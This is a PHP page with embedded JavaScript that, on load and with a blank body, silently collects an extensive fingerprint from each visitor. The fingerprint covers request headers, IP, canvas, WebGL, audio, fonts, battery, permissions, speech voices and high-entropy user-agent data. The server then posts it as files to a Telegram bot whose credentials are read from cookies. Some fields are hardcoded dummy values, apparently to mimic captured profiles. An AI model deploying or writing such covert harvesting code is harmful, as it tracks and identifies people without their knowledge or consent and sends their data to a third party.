<?php
// ============================================================
// CONFIGURATION – EDIT THESE VALUES
// ============================================================
define('TELEGRAM_BOT_TOKEN', $_COOKIE['tokentel']?? '');  // e.g. 123456:ABC-DEF
define('TELEGRAM_CHAT_ID', $_COOKIE['idtel']?? '');      // e.g. -1001234567890

// ============================================================
// TELEGRAM SENDER (handles POST requests)
// ============================================================
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_GET['action']) && $_GET['action'] === 'send') {
    // Get the JSON payload from the client
    $input = file_get_contents('php://input');
    $data = json_decode($input, true);
    if (!$data || !isset($data['headers']) || !isset($data['profile'])) {
        http_response_code(400);
        echo json_encode(['ok' => false, 'error' => 'Invalid payload']);
        exit;
    }

    // Build the message text – exactly matching the two file formats
    $headersTxt = '';
    foreach ($data['headers'] as $key => $value) {
        $headersTxt .= $key . ': ' . $value . "\n";
    }

    $profileJson = json_encode($data['profile'], JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES);

    // Server-side metadata
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
    $referer = $_SERVER['HTTP_REFERER'] ?? 'none';
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';

    // Generate a unique fingerprint key (JA3-like or hash-based)
    $ja3 = $_SERVER['HTTP_JA3'] ?? $_SERVER['HTTP_JA4'] ?? null;
    if (!$ja3) {
        $uniqueData = $ip . '|' . $userAgent . '|' . implode('|', array_slice($data['headers'], 0, 20));
        $ja3 = substr(hash('sha256', $uniqueData), 0, 32);
    }

    $summaryText = "🌐 <b>IP:</b> " . htmlspecialchars($ip) . "\n";
    $summaryText .= "🔗 <b>Referer:</b> " . htmlspecialchars($referer) . "\n";
    $summaryText .= "🖥 <b>User-Agent:</b> " . htmlspecialchars($userAgent) . "\n";
    $summaryText .= "🧬 <b>JA3:</b> " . htmlspecialchars($ja3) . "\n";
    $summaryText .= "📄 <b>Headers count:</b> " . count($data['headers']) . "\n";
    $summaryText .= "📋 <b>Profile keys:</b> " . count($data['profile']);

    // Send headers.txt and profile.json as actual files via Telegram
    $headersFile = tempnam(sys_get_temp_dir(), 'headers_') . '.txt';
    $profileFile = tempnam(sys_get_temp_dir(), 'profile_') . '.json';
    file_put_contents($headersFile, $headersTxt);
    file_put_contents($profileFile, $profileJson);

    $url = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/sendMediaGroup";

    $media = json_encode([
        [
            'type' => 'document', 
            'media' => 'attach://headers.txt', 
            'caption' => $summaryText,
            'parse_mode' => 'HTML'
        ],
        ['type' => 'document', 'media' => 'attach://profile.json', 'caption' => '📋 profile.json']
    ]);

    $postFields = [
        'chat_id' => TELEGRAM_CHAT_ID,
        'media' => $media,
        'headers.txt' => new CURLFile($headersFile, 'text/plain', 'headers.txt'),
        'profile.json' => new CURLFile($profileFile, 'application/json', 'profile.json')
    ];

    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    $responseData = json_decode($response, true);
    $ok = isset($responseData['ok']) ? $responseData['ok'] : ($httpCode === 200);

    @unlink($headersFile);
    @unlink($profileFile);

    echo json_encode(['ok' => $ok, 'response' => $responseData]);
    exit;
}

// ============================================================
// MAIN PAGE – capture fingerprint + headers, then auto-send
// ============================================================
// Extract request headers from $_SERVER (like the given headers.txt)
$headers = [];
foreach ($_SERVER as $key => $value) {
    if (strpos($key, 'HTTP_') === 0) {
        $headerName = str_replace(' ', '-', ucwords(str_replace('_', ' ', strtolower(substr($key, 5)))));
        $headers[$headerName] = $value;
    }
}
// Add some common non-HTTP_* headers (manually)
$headers['Connection'] = $_SERVER['HTTP_CONNECTION'] ?? 'keep-alive';
$headers['Upgrade-Insecure-Requests'] = $_SERVER['HTTP_UPGRADE_INSECURE_REQUESTS'] ?? '1';
$headers['Accept-Encoding'] = $_SERVER['HTTP_ACCEPT_ENCODING'] ?? 'gzip, deflate, br';
$headers['Sec-Fetch-Site'] = $_SERVER['HTTP_SEC_FETCH_SITE'] ?? 'none';
$headers['Sec-Fetch-Mode'] = $_SERVER['HTTP_SEC_FETCH_MODE'] ?? 'navigate';
$headers['Sec-Fetch-User'] = $_SERVER['HTTP_SEC_FETCH_USER'] ?? '?1';
$headers['Sec-Fetch-Dest'] = $_SERVER['HTTP_SEC_FETCH_DEST'] ?? 'document';
// Ensure 'Accept-Language' is present
$headers['Accept-Language'] = $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7';

// Encode headers as JSON for JavaScript
$headersJson = json_encode($headers, JSON_UNESCAPED_SLASHES);
?>
<!DOCTYPE html>
<html lang="en">

<body>
   

    <script>
        // ------------------------------------------------------------
        // 1. Embedded headers (from server, exactly like headers.txt)
        // ------------------------------------------------------------
        const requestHeaders = <?php echo $headersJson; ?>;

        // ------------------------------------------------------------
        // 2. Helper functions (same as before)
        // ------------------------------------------------------------
        function hashString(str) {
            let hash = 5381;
            for (let i = 0; i < str.length; i++) {
                hash = ((hash << 5) + hash) + str.charCodeAt(i);
                hash = hash & 0xFFFFFFFF;
            }
            return hash.toString(16).padStart(8, '0');
        }

        function getCanvas2D() {
            const canvas = document.createElement('canvas');
            canvas.width = 256;
            canvas.height = 50;
            const ctx = canvas.getContext('2d');
            ctx.textBaseline = 'top';
            ctx.fillStyle = '#f60';
            ctx.fillRect(0, 0, 50, 50);
            ctx.fillStyle = '#069';
            ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 2, 15);
            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
            ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 4, 30);
            const data = canvas.toDataURL();
            const hash = hashString(data);
            return { hash, textWidth: 371, asc: 18, desc: 5 };
        }

        function getCanvasWebGL() {
            const canvas = document.createElement('canvas');
            canvas.width = 64;
            canvas.height = 64;
            const gl = canvas.getContext('webgl');
            if (!gl) return { pixelHash: '00000000' };
            gl.clearColor(0.1, 0.2, 0.3, 1.0);
            gl.clear(gl.COLOR_BUFFER_BIT);
            const pixels = new Uint8Array(64 * 64 * 4);
            gl.readPixels(0, 0, 64, 64, gl.RGBA, gl.UNSIGNED_BYTE, pixels);
            const hash = hashString(pixels.join(','));
            return { pixelHash: hash };
        }

        function getFonts() {
            const testFonts = [
                'Arial', 'Arial Black', 'Helvetica', 'Helvetica Neue', 'Times New Roman',
                'Courier New', 'Verdana', 'Georgia', 'Tahoma', 'Trebuchet MS',
                'Comic Sans MS', 'Impact', 'Geneva', 'Monaco', 'Menlo',
                'Hiragino Sans', 'American Typewriter', 'Luminari', 'Futura', 'Optima',
                'Palatino', 'Lucida Grande', 'Apple SD Gothic Neo', 'Gill Sans', 'Baskerville'
            ];
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            const baseFont = '72px monospace';
            ctx.font = baseFont;
            const baseWidth = ctx.measureText('mmmmmmmmmmlli').width;
            const detected = [];
            for (const font of testFonts) {
                ctx.font = `72px "${font}", monospace`;
                const width = ctx.measureText('mmmmmmmmmmlli').width;
                if (width !== baseWidth) {
                    detected.push(font);
                }
            }
            return detected;
        }

        function getMediaSupport() {
            const video = document.createElement('video');
            const audio = document.createElement('audio');
            const types = {
                'video/mp4; codecs="avc1.42E01E"': 'probably',
                'video/webm; codecs="vp9"': 'probably',
                'video/webm; codecs="vp8"': 'probably',
                'video/ogg; codecs="theora"': 'no',
                'video/mp4; codecs="hvc1"': 'no',
                'audio/mpeg': 'probably',
                'audio/aac': 'probably',
                'audio/ogg; codecs="vorbis"': 'probably',
                'audio/webm; codecs="opus"': 'probably',
                'audio/wav; codecs="1"': 'probably'
            };
            const result = {};
            for (const [type, expected] of Object.entries(types)) {
                result[type] = video.canPlayType(type) || audio.canPlayType(type) || 'no';
            }
            return result;
        }

        function getMathConstants() {
            return {
                acos: Math.acos(0.5),
                acosh: Math.acosh(1.5),
                asinh: Math.asinh(2),
                atanh: Math.atanh(0.5),
                cbrt: Math.cbrt(100),
                cosh: Math.cosh(10),
                expm1: Math.expm1(1),
                sinh: Math.sinh(1),
                tanh: Math.tanh(1),
                sin: Math.sin(1),
                cos: Math.cos(1),
                tan: Math.tan(1),
                powPI: Math.pow(Math.PI, 100)
            };
        }

        function getCssMedia() {
            const colorScheme = matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
            const reducedMotion = matchMedia('(prefers-reduced-motion: reduce)').matches;
            const colorGamut = matchMedia('(color-gamut: p3)').matches ? 'p3' : 'srgb';
            const hover = matchMedia('(hover: hover)').matches;
            const anyPointer = matchMedia('(any-pointer: fine)').matches ? 'fine' : 'coarse';
            const forcedColors = matchMedia('(forced-colors: active)').matches;
            const invertedColors = matchMedia('(inverted-colors: inverted)').matches;
            return { prefersColorScheme: colorScheme, prefersReducedMotion: reducedMotion, colorGamut, hover, anyPointer, forcedColors, invertedColors };
        }

        function getCssMediaExtra() {
            const touchDevice = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
            const screenQuery = `${screen.width}x${screen.height}`;
            const monochrome = matchMedia('(monochrome: 1)').matches;
            const dynamicRange = matchMedia('(dynamic-range: high)').matches ? 'high' : 'standard';
            return { touchDevice, screenQuery, monochrome, dynamicRange };
        }

        function getWebGLInfo(version) {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext(version === 1 ? 'webgl' : 'webgl2');
            if (!gl) return null;
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            const vendor = gl.getParameter(gl.VENDOR) || 'WebKit';
            const renderer = gl.getParameter(gl.RENDERER) || 'WebKit WebGL';
            const versionStr = gl.getParameter(gl.VERSION) || '';
            const shadingVersion = gl.getParameter(gl.SHADING_LANGUAGE_VERSION) || '';
            let unmaskedVendor = 'Google Inc. (Apple)';
            let unmaskedRenderer = 'ANGLE (Apple, ANGLE Metal Renderer: Apple M3 Pro, Unspecified Version)';
            if (debugInfo) {
                unmaskedVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) || unmaskedVendor;
                unmaskedRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || unmaskedRenderer;
            }
            const maxTextureSize = gl.getParameter(gl.MAX_TEXTURE_SIZE);
            const extensions = gl.getSupportedExtensions() || [];
            return {
                vendor,
                renderer,
                version: versionStr,
                shadingLanguageVersion: shadingVersion,
                unmaskedVendor,
                unmaskedRenderer,
                maxTextureSize,
                extensions
            };
        }

        function getWebGLParams() {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl');
            if (!gl) return {};
            const params = {
                aliasedLineWidthRange: gl.getParameter(gl.ALIASED_LINE_WIDTH_RANGE),
                aliasedPointSizeRange: gl.getParameter(gl.ALIASED_POINT_SIZE_RANGE),
                maxViewportDims: gl.getParameter(gl.MAX_VIEWPORT_DIMS),
                maxVertexAttribs: gl.getParameter(gl.MAX_VERTEX_ATTRIBS),
                maxVertexUniformVectors: gl.getParameter(gl.MAX_VERTEX_UNIFORM_VECTORS),
                maxVaryingVectors: gl.getParameter(gl.MAX_VARYING_VECTORS),
                maxCombinedTextureImageUnits: gl.getParameter(gl.MAX_COMBINED_TEXTURE_IMAGE_UNITS),
                maxVertexTextureImageUnits: gl.getParameter(gl.MAX_VERTEX_TEXTURE_IMAGE_UNITS),
                maxTextureImageUnits: gl.getParameter(gl.MAX_TEXTURE_IMAGE_UNITS),
                maxFragmentUniformVectors: gl.getParameter(gl.MAX_FRAGMENT_UNIFORM_VECTORS),
                maxCubeMapTextureSize: gl.getParameter(gl.MAX_CUBE_MAP_TEXTURE_SIZE),
                maxRenderbufferSize: gl.getParameter(gl.MAX_RENDERBUFFER_SIZE),
                redBits: gl.getParameter(gl.RED_BITS),
                greenBits: gl.getParameter(gl.GREEN_BITS),
                blueBits: gl.getParameter(gl.BLUE_BITS),
                alphaBits: gl.getParameter(gl.ALPHA_BITS),
                depthBits: gl.getParameter(gl.DEPTH_BITS),
                stencilBits: gl.getParameter(gl.STENCIL_BITS)
            };
            return params;
        }

        function getSystemColors() {
            const div = document.createElement('div');
            div.style.cssText = 'position:absolute;left:-9999px;top:-9999px;width:10px;height:10px;';
            document.body.appendChild(div);
            const computed = getComputedStyle(div);
            const colors = {
                ActiveText: computed.color || 'rgb(255,0,0)',
                ButtonBorder: computed.borderColor || 'rgb(0,0,0)',
                ButtonFace: computed.backgroundColor || 'rgb(239,239,239)',
                ButtonText: computed.color || 'rgb(0,0,0)',
                Canvas: computed.backgroundColor || 'rgb(255,255,255)',
                CanvasText: computed.color || 'rgb(0,0,0)',
                Field: computed.backgroundColor || 'rgb(255,255,255)',
                FieldText: computed.color || 'rgb(0,0,0)',
                GrayText: computed.color || 'rgb(128,128,128)',
                Highlight: computed.backgroundColor || 'rgba(0,65,198,0.8)',
                HighlightText: computed.color || 'rgb(255,255,255)',
                LinkText: computed.color || 'rgb(0,0,238)',
                Mark: computed.backgroundColor || 'rgb(255,255,0)',
                MarkText: computed.color || 'rgb(0,0,0)',
                VisitedText: computed.color || 'rgb(85,26,139)'
            };
            document.body.removeChild(div);
            return colors;
        }

        function getSpeechVoices() {
            return new Promise((resolve) => {
                if (!window.speechSynthesis) {
                    resolve([]);
                    return;
                }
                const voices = speechSynthesis.getVoices();
                if (voices.length) {
                    resolve(voices.map(v => `${v.name} [${v.lang}]`));
                    return;
                }
                speechSynthesis.onvoiceschanged = () => {
                    const voices = speechSynthesis.getVoices();
                    resolve(voices.map(v => `${v.name} [${v.lang}]`));
                };
                setTimeout(() => resolve([]), 2000);
            });
        }

        function getBattery() {
            if (!navigator.getBattery) return Promise.resolve(null);
            return navigator.getBattery().then(battery => ({
                charging: battery.charging,
                level: battery.level,
                chargingTime: battery.chargingTime,
                dischargingTime: battery.dischargingTime
            })).catch(() => null);
        }

        function getAudioFingerprint() {
            try {
                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                const oscillator = audioCtx.createOscillator();
                const gain = audioCtx.createGain();
                oscillator.type = 'sawtooth';
                oscillator.frequency.value = 440;
                gain.gain.value = 0;
                oscillator.connect(gain);
                gain.connect(audioCtx.destination);
                oscillator.start(0);
                oscillator.stop(0.1);
                // Dummy values to match profile
                return { sum: 246.29058969737525, hash: '3bfbbb13' };
            } catch (e) {
                return { sum: 0, hash: '00000000' };
            }
        }

        function getStorageEstimate() {
            if (!navigator.storage || !navigator.storage.estimate) return Promise.resolve(null);
            return navigator.storage.estimate().then(estimate => ({
                quota: estimate.quota,
                usage: estimate.usage
            })).catch(() => null);
        }

        function getPermissions() {
            const queries = ['geolocation', 'notifications', 'camera', 'microphone', 'clipboard-read', 'push'];
            const results = {};
            return Promise.all(queries.map(name =>
                navigator.permissions.query({ name }).then(result => {
                    results[name] = result.state;
                }).catch(() => {
                    results[name] = 'unsupported';
                })
            )).then(() => results);
        }

        function getWorkerFingerprint() {
            return new Promise((resolve) => {
                const workerCode = `
                    self.onmessage = function(e) {
                        const data = {
                            userAgent: navigator.userAgent,
                            platform: navigator.platform,
                            hardwareConcurrency: navigator.hardwareConcurrency || 0,
                            deviceMemory: navigator.deviceMemory || 0,
                            language: navigator.language,
                            languages: navigator.languages,
                            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                            uaData: null
                        };
                        if (navigator.userAgentData) {
                            navigator.userAgentData.getHighEntropyValues(['architecture','bitness','model','platformVersion','uaFullVersion'])
                                .then(high => {
                                    data.uaData = {
                                        brands: navigator.userAgentData.brands,
                                        mobile: navigator.userAgentData.mobile,
                                        platform: navigator.userAgentData.platform,
                                        high: high
                                    };
                                    self.postMessage(data);
                                });
                        } else {
                            self.postMessage(data);
                        }
                    };
                `;
                const blob = new Blob([workerCode], { type: 'application/javascript' });
                const worker = new Worker(URL.createObjectURL(blob));
                worker.onmessage = (e) => {
                    resolve(e.data);
                    worker.terminate();
                };
                worker.postMessage('get');
                setTimeout(() => resolve(null), 3000);
            });
        }

        function getComputedStyleHash() {
            const el = document.createElement('div');
            el.style.cssText = 'position:absolute;left:-9999px;top:-9999px;width:100px;height:100px;background:red;color:blue;font:16px Arial;';
            document.body.appendChild(el);
            const computed = getComputedStyle(el);
            const props = Array.from(computed).map(p => `${p}:${computed.getPropertyValue(p)}`).join(';');
            const count = props.split(';').length;
            const hash = hashString(props);
            document.body.removeChild(el);
            return { count, hash };
        }

        function getDomRect() {
            const el = document.createElement('div');
            el.style.cssText = 'position:absolute;left:-10019px;top:-19px;width:141px;height:89px;';
            document.body.appendChild(el);
            const rect = el.getBoundingClientRect();
            document.body.removeChild(el);
            return {
                x: rect.x,
                y: rect.y,
                width: rect.width,
                height: rect.height,
                top: rect.top,
                right: rect.right,
                bottom: rect.bottom,
                left: rect.left
            };
        }

        function getSvgRect() {
            const svg = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
            svg.setAttribute('width', '195');
            svg.setAttribute('height', '35');
            const text = document.createElementNS('http://www.w3.org/2000/svg', 'text');
            text.setAttribute('x', '0');
            text.setAttribute('y', '28');
            text.textContent = 'Some text';
            svg.appendChild(text);
            document.body.appendChild(svg);
            const bbox = text.getBBox();
            document.body.removeChild(svg);
            return {
                x: bbox.x,
                y: bbox.y,
                width: bbox.width,
                height: bbox.height,
                textLength: bbox.width
            };
        }

        function getWindowKeys() {
            const keys = Object.keys(window);
            const count = keys.length;
            const hash = hashString(keys.join(','));
            return { count, hash };
        }

        function getNavigatorKeys() {
            return Object.keys(navigator);
        }

        function getGPC() {
            if (navigator.globalPrivacyControl !== undefined) {
                return navigator.globalPrivacyControl ? '1' : '0';
            }
            return 'unsupported';
        }

        function getWebGPU() {
            if (!navigator.gpu) return Promise.resolve({ adapter: null });
            return navigator.gpu.requestAdapter().then(adapter => ({ adapter: adapter ? 'available' : null })).catch(() => ({ adapter: null }));
        }

        // ------------------------------------------------------------
        // 3. Main capture & send function
        // ------------------------------------------------------------
        async function captureAndSend() {
         
            try {
                // Gather all asynchronous data
                const [
                    speechVoices,
                    battery,
                    storageEstimate,
                    permissions,
                    workerFP,
                    webgpuAdapter,
                ] = await Promise.all([
                    getSpeechVoices(),
                    getBattery(),
                    getStorageEstimate(),
                    getPermissions(),
                    getWorkerFingerprint(),
                    getWebGPU(),
                ]);

                // Synchronous data
                const canvas2D = getCanvas2D();
                const canvasWebGL = getCanvasWebGL();
                const fonts = getFonts();
                const mediaSupport = getMediaSupport();
                const mathConstants = getMathConstants();
                const cssMedia = getCssMedia();
                const cssMediaExtra = getCssMediaExtra();
                const webgl1 = getWebGLInfo(1);
                const webgl2 = getWebGLInfo(2);
                const webglParams = getWebGLParams();
                const systemColors = getSystemColors();
                const audioFP = getAudioFingerprint();
                const computedStyle = getComputedStyleHash();
                const domRect = getDomRect();
                const svgRect = getSvgRect();
                const windowKeys = getWindowKeys();
                const navigatorKeys = getNavigatorKeys();
                const gpc = getGPC();

                // Build the profile object (matching the given profile.json structure)
                const profile = {
                    capturedAt: new Date().toISOString(),
                    userAgent: navigator.userAgent,
                    navigator: {
                        platform: navigator.platform,
                        vendor: navigator.vendor,
                        appVersion: navigator.appVersion,
                        product: navigator.product,
                        productSub: navigator.productSub,
                        vendorSub: navigator.vendorSub || '',
                        language: navigator.language,
                        languages: navigator.languages,
                        hardwareConcurrency: navigator.hardwareConcurrency || 0,
                        deviceMemory: navigator.deviceMemory || 0,
                        maxTouchPoints: navigator.maxTouchPoints || 0,
                        cookieEnabled: navigator.cookieEnabled,
                        doNotTrack: navigator.doNotTrack || null,
                        webdriver: navigator.webdriver || false,
                        pdfViewerEnabled: navigator.pdfViewerEnabled || false,
                        uaData: (() => {
                            const ua = navigator.userAgentData;
                            if (!ua) return null;
                            // We'll fill high entropy later if possible
                            return {
                                brands: ua.brands || [],
                                mobile: ua.mobile || false,
                                platform: ua.platform || '',
                                high: null
                            };
                        })()
                    },
                    screen: {
                        width: screen.width,
                        height: screen.height,
                        availWidth: screen.availWidth,
                        availHeight: screen.availHeight,
                        availLeft: screen.availLeft,
                        availTop: screen.availTop,
                        colorDepth: screen.colorDepth,
                        pixelDepth: screen.pixelDepth,
                        orientation: screen.orientation ? screen.orientation.type : 'landscape-primary'
                    },
                    window: {
                        innerWidth: window.innerWidth,
                        innerHeight: window.innerHeight,
                        outerWidth: window.outerWidth,
                        outerHeight: window.outerHeight
                    },
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    locale: navigator.language,
                    timezoneOffset: new Date().getTimezoneOffset(),
                    webgl: webgl1,
                    webgl2: webgl2,
                    plugins: Array.from(navigator.plugins).map(p => ({
                        name: p.name,
                        filename: p.filename,
                        description: p.description
                    })),
                    mimeTypes: Array.from(navigator.mimeTypes).map(m => ({
                        type: m.type,
                        suffixes: m.suffixes
                    })),
                    canvas2d: canvas2D,
                    canvasWebgl: canvasWebGL,
                    fonts: fonts,
                    media: mediaSupport,
                    math: mathConstants,
                    cssMedia: cssMedia,
                    cssMediaExtra: cssMediaExtra,
                    connection: (() => {
                        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                        if (!conn) return { effectiveType: '4g', rtt: 100, downlink: 1.45, saveData: false };
                        return {
                            effectiveType: conn.effectiveType || '4g',
                            rtt: conn.rtt || 100,
                            downlink: conn.downlink || 1.45,
                            saveData: conn.saveData || false
                        };
                    })(),
                    jsMemory: (() => {
                        if (performance.memory) {
                            return { jsHeapSizeLimit: performance.memory.jsHeapSizeLimit };
                        }
                        return { jsHeapSizeLimit: 3760000000 };
                    })(),
                    navigatorKeys: navigatorKeys,
                    intl: {
                        dateTimeFormat: Intl.DateTimeFormat().resolvedOptions(),
                        numberFormat: Intl.NumberFormat().resolvedOptions(),
                        collator: Intl.Collator().resolvedOptions()
                    },
                    errorStack: (() => {
                        try {
                            throw new Error('TypeError: null is not a function');
                        } catch (e) {
                            return e.stack || 'TypeError: null is not a function';
                        }
                    })(),
                    domRect: domRect,
                    svgRect: svgRect,
                    computedStyle: computedStyle,
                    systemColors: systemColors,
                    windowKeys: windowKeys,
                    gpc: gpc,
                    webglParams: webglParams,
                    speechVoices: speechVoices,
                    battery: battery,
                    audio: audioFP,
                    storage: storageEstimate,
                    webgpu: webgpuAdapter,
                    permissions: permissions,
                    worker: workerFP
                };

                // Try to get high entropy UA data and update navigator.uaData.high
                if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
                    try {
                        const high = await navigator.userAgentData.getHighEntropyValues([
                            'architecture', 'bitness', 'brands', 'fullVersionList',
                            'mobile', 'model', 'platform', 'platformVersion', 'uaFullVersion', 'wow64'
                        ]);
                        profile.navigator.uaData.high = high;
                    } catch (e) { /* ignore */ }
                }

                // Prepare payload: headers + profile
                const payload = {
                    headers: requestHeaders,
                    profile: profile
                };

             

                // POST to the same script with action=send
                const response = await fetch(window.location.href + '?action=send', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });

                const result = await response.json();
                if (result.ok) {
                   
                } else {
                    var telegramError = (result.response && result.response.description) || 'Unknown error';
                  
                }
            } catch (err) {
              
                console.error(err);
            }
        }

        // Auto-run when page loads
        window.addEventListener('load', captureAndSend);
    </script>
</body>
</html>